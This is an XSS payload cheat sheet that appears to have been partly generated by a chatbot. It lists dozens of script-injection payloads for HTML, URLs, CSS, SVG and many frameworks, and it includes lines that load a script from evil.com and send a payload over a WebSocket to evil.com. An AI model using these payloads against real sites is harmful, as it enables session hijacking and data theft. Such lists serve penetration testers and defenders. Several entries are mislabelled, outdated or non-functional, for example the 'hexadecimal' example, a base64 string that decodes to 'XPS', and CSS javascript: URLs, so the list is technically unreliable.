# XSS
XSS quick fire samples:

HTML/JavaScript

  ```html
  <script>alert('XSS')</script>
  ```

```html
<img src=x onerror=alert('XSS')>
```

```html
<svg><script>alert('XSS')</script></svg>
```

 ```html
 <iframe src="javascript:alert('XSS')"></iframe>
```

```html
<body onload=alert('XSS')>
```



URL Parameters:

 ```url
 http://example.com/?q=<script>alert('XSS')</script>
```

```url
http://example.com/?q=<img src=x onerror=alert('XSS')>
```



JavaScript (JavaScript Events)

```javascript
<a href="#" onclick="alert('XSS')">Click me</a>
```

```javascript
<div onmouseover="alert('XSS')">Hover over me</div>
```



JSON
```jsom
{"data": "<script>alert('XSS')</script>"}
```
XML
```xml
<data><![CDATA[<script>alert('XSS')</script>]]></data>
```

PHP (Common Injections)

```php
   <?php echo '<script>alert("XSS")</script>'; ?>
```


```php
<?php echo $_GET['input']; ?>
```



ASP.NET
```asp
<%= "<script>alert('XSS')</script>" %>
```
Ruby on Rails (ERB)
```ruby
<%= "<script>alert('XSS')</script>".html_safe %>
```
Python (Flask)

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/<input>')
def index(input):
    return render_template_string(f"<script>alert('{input}')</script>")
```
Node.js (Express)
```node.js
app.get('/input', (req, res) => {
    const input = req.query.input;
    res.send(`<script>alert('${input}')</script>`);
});
```
AngularJS
```angular
<div ng-bind="userInput"></div>
<script>
    var app = angular.module('myApp', []);
    app.controller('myCtrl', function($scope) {
        $scope.userInput = "<script>alert('XSS')</script>";
    });
</script>
```
Vue.js
```vue
<div v-html="userInput"></div>
<script>
    new Vue({
        el: '#app',
        data: {
            userInput: "<script>alert('XSS')</script>"
        }
    });
</script>
```
ASP Classic
```asp
<%
Response.Write "<script>alert('XSS')</script>"
%>
```
ColdFusion
```cf
<cfoutput>
    <script>alert('#form.input#')</script>
</cfoutput>
```
C# (ASP.NET MVC)
```c#
@Html.Raw("<script>alert('XSS')</script>")
```
Common Encodings:

URL encoding:
```url
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```
HTML encoding: 

```html
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

Special Cases:

CSS injection: background-image: 
```css
url("javascript:alert('XSS')")
```
JSONP: 
```jsonp
callbackFunction(<script>alert('XSS')</script>)
```



Other Techniques

Meta Tags:
```html
<meta http-equiv="refresh" content="0; url=javascript:alert('XSS');">
```

Form Action:
```html
<form action="javascript:alert('XSS')">
    <input type="submit" value="Submit">
</form>
```

Base64 Encoded:

 ```base64html
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFBTJyk8L3NjcmlwdD4=
```


CSS Injection Payloads

background-image:
```css
url("javascript:alert('XSS')")
```


Special Cases

PDF:

Embedded JavaScript in PDF files.



SVG:
```html
<svg><script>alert('XSS')</script></svg>
```

General Notes

Test each payload contextually; not all payloads will work in every environment.

Understand the context in which each payload is executed (HTML, attribute, JavaScript, etc.).


### Advanced XSS techniques and payloads:

Advanced XSS Techniques

1. DOM-Based XSS

Exploiting URL Hash:

```javascript
window.location.hash = "#<script>alert('XSS')</script>";
```
Using document.write:
```javascript
<script>document.write('<script>alert("XSS")<\/script>');</script>
```

Event Handler Injection

Using onload in Images:
```html
<img src="invalid.jpg" onload="alert('XSS')">
```
Mouse Event Manipulation:
```html
<div onmouseover="alert('XSS')" style="height:100px; width:100px; background-color:red;"></div>
```

Contextual XSS

Inline Event Handlers:
```html
<button onclick="alert('XSS')">Click Me</button>
```
Data Attributes:
```html
<div data-info="<script>alert('XSS')</script>"></div>
```

JSON-Based Attacks

Exploiting JavaScript Deserialization:
```json
{"callback": "alert('XSS')"}
```
Dynamic Script Loading:
```javascript
var script = document.createElement('script');
script.src = "data:text/javascript,alert('XSS')";
document.body.appendChild(script);

```
Polyglot Payloads

Combining Contexts:
```html
<svg><g/onload="alert('XSS')"></g></svg>
```
Using iframe for Escape:
```javascript
<iframe src="javascript:alert('XSS')"></iframe>
```

SVG Injection

Embedded JavaScript:
```javascript
<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>
```
Using feImage for External Resources:
```javascript
<svg><image href="data:image/svg+xml,<svg><script>alert('XSS')</script></svg>"/></svg>
```

CSS-Related XSS

CSS Keyframes:
```css
@keyframes x { 0% {background: red;} 100% {background: url("javascript:alert('XSS')")}}
```

Exploiting Frameworks

React (Unescaped HTML):
```html
const userInput = "<script>alert('XSS')</script>";
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```
Angular (Bypassing Security):
```angular
import { DomSanitizer } from '@angular/platform-browser';
const sanitizedHtml = this.sanitizer.bypassSecurityTrustHtml("<script>alert('XSS')</script>");
```

Server-Side Injection

HTTP Response Splitting:

Sending a header with newline characters to inject scripts.


Cookie Injection:

If cookies are read and output without sanitization:

```javascript
document.cookie = "mycookie=<script>alert('XSS')</script>";
```

AJAX and XHR Exploits

Loading External Scripts:
```html
var script = document.createElement('script');
script.src = 'http://evil.com/malicious.js';
document.body.appendChild(script);
```
XSS with JSONP:
```jsonp
<script src="http://example.com/callback?data=<script>alert('XSS')</script>"></script>
```

Additional Payloads and Scenarios

Testing With Special Characters

Using Special Characters:
```javascript
<script>document.body.innerHTML += '<img src=x onerror=alert("XSS")>'; </script>
```

Exploiting XML and SOAP

XML Injection:
```xml
<request><param><script>alert('XSS')</script></param></request>
```
SOAP Payload:
```html
<Envelope><Body><script>alert('XSS')</script></Body></Envelope>

```
Using HTML5 Features

WebSockets:
```html
new WebSocket('ws://evil.com?payload=<script>alert("XSS")</script>');
```
Web Workers:
```html
const worker = new Worker('data:text/javascript,alert("XSS")');

```


Here’s a further expansion on advanced XSS techniques and payloads:

Advanced XSS Techniques (Continued)

Exploiting the document Object

Using document.write with Dynamic Content:
```html
<script>var userInput = "<script>alert('XSS')</script>"; document.write(userInput);</script>
```
Manipulating document.createElement:
```javascript
var script = document.createElement('script');
script.text = "alert('XSS')";
document.body.appendChild(script);
```

Cross-Domain Techniques

Using window.opener:

In a pop-up, access the parent window.

```javascript
window.opener.alert('XSS');
```
Exploiting CORS Misconfigurations:

Sending malicious requests from an untrusted domain.



Exploiting Web APIs

Fetch API with Malicious Input:
```javascript
fetch('http://example.com/api?param=<script>alert("XSS")</script>');
```
Using WebSockets:
```html
var ws = new WebSocket('ws://example.com/socket');
ws.onmessage = function(event) { eval(event.data); };
```

Template Injection

Exploiting Templating Engines:

If the application uses a templating engine that evaluates unescaped input:

```html
{{ "<script>alert('XSS')</script>" }}
```

Exploiting Dynamic Rendering

Using JavaScript Variables:
```javascript
var userInput = "<script>alert('XSS')</script>";
eval(userInput);
```

Local Storage and Session Storage

Storing Malicious Payload:

```javaacript
localStorage.setItem('key', "<script>alert('XSS')</script>");
```

Retrieving and Executing:

```javascript
var payload = localStorage.getItem('key');
eval(payload);
```

CSS Tricks

Using CSS @import:

```css
@import 'data:text/css,body{background:url("javascript:alert(1)")}';
```
Keyframe Animations:

```css
@keyframes x { 0% { background: url("javascript:alert('XSS')") } }
```

Context-Specific Payloads

HTML Comments

Using Comments to Bypass Filters:
```html
<script><!--alert('XSS')--></script>
```

Exploiting srcdoc Attribute in iframe

Injecting Scripts via srcdoc:
```html
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
```

Audio and Video Tags

Using onerror in Media Elements:
```html
<audio src="invalid.mp3" onerror="alert('XSS')"></audio>
```

Flash and Other Plugins

Flash Payloads:
```html
<object data="data:application/x-shockwave-flash,<script>alert('XSS')</script>"></object>
```

QR Codes and Links

Generating QR Codes with Payloads:

Encode URLs leading to malicious scripts.

WordPress and CMS Exploits

Using Shortcodes:
```html
[xss]<script>alert('XSS')</script>[/xss]
```
Theme and Plugin Vulnerabilities:

Injecting payloads into fields that do not sanitize input.


Advanced Browser Features

Service Workers:

Registering a service worker that intercepts requests and injects scripts.

Data URIs

Using Data URIs for XSS:
```html
<img src="data:image/png;base64,iVBORw0KGg...<script>alert('XSS')</script>">
```

Exploiting Framework Limitations

Vue.js (v-html):
```vue.js
<div v-html="userInput"></div>
```
Angular (ng-bind):
```ng.js
<div ng-bind="userInput"></div>
```

Using Unvalidated Input

Reflected XSS through URL Parameters:

Accessing user input directly from the query string without sanitization.


Advanced HTTP Header Manipulation

Custom Headers with Malicious Payload:
```http
X-Custom-Header: <script>alert('XSS')</script>

```
Contextual JavaScript

Using JavaScript's Function Constructor:
```javascript
var payload = "alert('XSS')";
var func = new Function(payload);
func();
```

Using setTimeout and setInterval

Delaying Execution:
```javascript
setTimeout("alert('XSS')", 1000);
setInterval("alert('XSS')", 1000);
```


Hexadecimal Payloads

Basic Hexadecimal Encoding:
```html
<script>alert(String.fromCharCode(88, 83, 83))</script>
```

<script>alert('XSS')</script> encoded in url:

```url
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```


Various Languages and Frameworks

Java

Using JSP:

```jsp
<%= "<script>alert('XSS')</script>" %>
```

ASP.NET MVC

Razor View Injection:
```asp.net
@Html.Raw("<script>alert('XSS')</script>")
```

Django

Template Injection:
```django.js

{{ "<script>alert('XSS')</script>"|safe }}
```

Flask (Python)

Flask Template Rendering:
```python
return render_template_string('<script>alert("XSS")</script>')
```

PHP (Using eval)

Dynamic Code Execution:

```php
eval('?> <script>alert("XSS")</script> <?php');
```

Node.js (Template Strings)

Dynamic Injection:
```node.js
const userInput = "<script>alert('XSS')</script>";
res.send(`<html><body>${userInput}</body></html>`);
```

Using Unicode and Character Encoding

Unicode Characters:
```html
<script>document.body.innerHTML += '\u003Cscript\u003Ealert(\u0027XSS\u0027)\u003C/script\u003E';</script>
```
Exploiting Object Prototypes

Modifying Prototypes:
```javascript
Object.prototype.toString = function() { alert('XSS'); };
```

Payloads in WebSocket Messages

Sending Malicious Payloads:
```javascript
var ws = new WebSocket('ws://example.com');
ws.onmessage = function(event) { eval(event.data); };
ws.send("<script>alert('XSS')</script>");
```

Advanced CSS Injection

CSS Filters:

filter: 
```css
progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert("XSS")', sizingMethod='scale');
```

Using Base64 Encoding

Base64 Encoded Payload:
```javascript
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycpOw=="></script>
```

Function Overriding

Overriding alert Function:
```javascript
window.alert = function() { console.log('XSS'); };
alert('XSS');
```

Testing XSS in Local Storage

Storing XSS in Local Storage:
```javascript
localStorage.setItem('xss', "<script>alert('XSS')</script>");
var xssPayload = localStorage.getItem('xss');
eval(xssPayload);
```

Exploiting Malicious Forms

Form Submission with Payload:
```javascript
<form action="http://example.com" method="post">
    <input type="text" name="data" value="<script>alert('XSS')</script>">
    <input type="submit">
</form>
```

Using XSS in SQL Injection

Combining SQL and XSS:
```sql
SELECT * FROM users WHERE name = '<script>alert("XSS")</script>';
```

Leveraging HTML5 Features

Using the sandbox Attribute:
```html
<iframe src="javascript:alert('XSS');" sandbox="allow-same-origin"></iframe>
```

Event Listeners

Adding Event Listeners Dynamically:
```html
document.addEventListener('click', function() {
    alert('XSS');
});
```

Using Custom JavaScript Functions

Custom Function for XSS:
```javascript
function executeXSS() {
    alert('XSS');
}
executeXSS();
```

Encapsulated Scripts

Using Template Literals:
```javascript
const xss = `<script>alert('XSS')</script>`;
document.body.innerHTML += xss;
```

Exploiting Insecure Deserialization

Crafted Object Injection:

```javascript
const payload = {
    __proto__: { alert: function() { alert('XSS'); } }
};
console.log(payload);
```

Advanced Event Manipulation

Using onmessage:

```javascript
window.onmessage = function(event) {
    eval(event.data);
};
```

Combining Multiple Techniques

Combining setTimeout and eval:

```javascript
setTimeout("eval('<script>alert(1)</script>')", 1000);
```

Using Fragments in URLs

Fragment Identifier:

```url
http://example.com/#<script>alert('XSS')</script>
```

Exploiting Insecure Headers

Custom HTTP Headers:

```url
X-Custom-Header: <script>alert('XSS')</script>
```

Conclusion

Keep testing in various contexts, as different web technologies can change how XSS payloads behave.

Understanding how input is handled in different languages and frameworks can lead to discovering new vectors.

Always practice ethical hacking and ensure you have permission to test the systems.

Feel free to ask for further exploration into specific areas or techniques!

Continuously explore new XSS vectors, as web technologies evolve.

Keep up with the latest vulnerabilities and patches in frameworks.




